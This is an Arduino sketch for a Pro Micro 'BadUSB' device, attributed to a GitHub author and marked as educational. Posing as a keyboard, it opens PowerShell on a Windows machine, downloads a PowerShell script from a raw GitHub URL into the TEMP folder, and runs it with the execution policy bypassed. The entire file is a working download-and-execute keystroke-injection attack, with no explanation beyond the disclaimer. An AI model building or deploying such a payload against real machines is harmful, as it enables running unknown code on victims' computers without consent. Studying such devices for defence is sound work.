//       │ Author     : Cisamu
//       │ Name       : BadUSB-ArduinoProMicro
//       │ Contact    : https://github.com/cisamu123

//       This program is distributed for educational purposes only. 

#include <Keyboard.h>

void setup() {
    Keyboard.begin();
    delay(2000);

    // Open Run dialog (Win + R)
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(50);
    Keyboard.releaseAll();
    delay(500);

    // Type 'powershell' and Enter to open PowerShell window
    Keyboard.println("powershell");
    delay(50);
    Keyboard.write(KEY_RETURN);
    delay(1500);  // Wait for PowerShell window to open

    // Download the script to TEMP folder
    Keyboard.println("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/cisamu123/BadUSB-ArduinoProMicro/refs/heads/main/badusb.ps1' -OutFile \"$env:TEMP\\badusb.ps1\"");
    delay(100);
    Keyboard.write(KEY_RETURN);
    delay(5000);  // Wait for download to complete

    // Execute the downloaded script with bypass execution policy
    Keyboard.println("powershell -ExecutionPolicy Bypass -File \"$env:TEMP\\badusb.ps1\"");
    delay(100);
    Keyboard.write(KEY_RETURN);
    delay(500);

    // Exit PowerShell
    Keyboard.println("exit");
    delay(100);
    Keyboard.write(KEY_RETURN);
    delay(2000);
}

void loop() {}